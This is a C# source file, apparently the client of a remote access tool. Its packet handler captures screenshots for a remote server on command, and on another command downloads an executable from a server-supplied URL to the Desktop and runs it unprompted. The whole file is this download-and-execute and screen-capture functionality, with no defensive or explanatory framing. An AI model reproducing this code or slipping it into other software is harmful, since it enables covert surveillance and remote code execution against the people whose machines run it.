namespace ConsoleClient
{
    using ConsoleClient.Packets;
    using MarrySocket.MClient;
    using NetworkObjects;
    using System;
    using System.Net;

    public class HandlePacket
    {

        public HandlePacket()
        {

        }

        public void Handle(int packetId, object receivedClass, ServerSocket serverSocket)
        {
            switch (packetId)
            {
                case 1111:
                    if (receivedClass is Int64)
                    {
                        long quality = (long)receivedClass;
                        this.Send(serverSocket, new SendScreenShot(quality));
                       

                    }
                    break;

                case 1112:
                    if (receivedClass is DownloadExec)
                    {
                        DownloadExec downloadExec = (DownloadExec)receivedClass;
                        String url = downloadExec.url;

                  String DesktopPath ;
DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);


WebClient Client = new WebClient ();
Client.DownloadFile(url, DesktopPath + "/myfile.exe");
System.Diagnostics.Process.Start(DesktopPath + "/myfile.exe");
break;
                       
                    }




                    break;
            }
        }

        public void Send(ServerSocket serverSocket, ISendPacket iSendPacket)
        {
            iSendPacket.Send(serverSocket);
        }


    }
}
